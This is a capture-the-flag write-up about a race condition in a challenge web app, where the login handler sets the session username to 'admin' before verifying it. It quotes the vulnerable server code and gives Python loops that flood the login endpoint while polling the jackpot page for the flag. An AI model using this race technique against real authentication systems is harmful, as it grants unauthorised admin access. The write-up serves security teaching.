# Challenge `Guess a BIG Number` Writeup

- Vulnerability: 
  - Time-of-check Time-of-use / Race condition
- Where:
  - `/guess/number` endpoint
- Impact:
  - allows non-admin user access to admin-only endpoint

## Analyzing the server

This challenge consists in accessing the jackpot page as the admin revealing the flag.
The server allows for users to register and then login.
By sending a request to `/register` endpoint, the server redirects
to the login page and by sending a request to `/login` endpoint, the server redirects to the jackpot page.
Clicking this button will reveal a text `No luck... Maybe next time!`.  
By looking at the source code of the server, it's possible to see that the jackpot page only reveals the flag when the `current_session.username == 'admin'`.
```python
if current_session.username == 'admin':
        msg = FLAG
```
It's also revealed that momentarialy, during the login process, this variable `current_session.username` is set to the field `username` of the request form.
```python
current_session = get_current_session()
current_session.username = username
db.session.commit()
```

## Exploit

Since, the variable `current_session.username` is set without any confirmation from the database (only being reseted to `None` when the it confirms that the user is not registered), it's possible to set this variable to `admin` by sending a request to `/login` endpoint with the field `username` equal to `admin` and some non-empty random `password`. 
```python
params = {
    'username': 'admin', 
    'password': '1234'
}

def try_login():
    while True:
        session.post(URL+"/login", data=params)
```
Using the `Process` entity from the multiprocessing library, send a request to `/jackpot` endpoint parallelly and hope that the `current_session.username` is still `admin` granting access to the flag `SSof{What_admin?}`.
```python
while True:
    r = session.get(URL+"/jackpot")
    match = re.search("SSof{.*}", r.text)
    if match:
        print(match.group(0))
        break
```

## Implementation

These code snippets and full implementation can be found [here](another_jackpot.py).
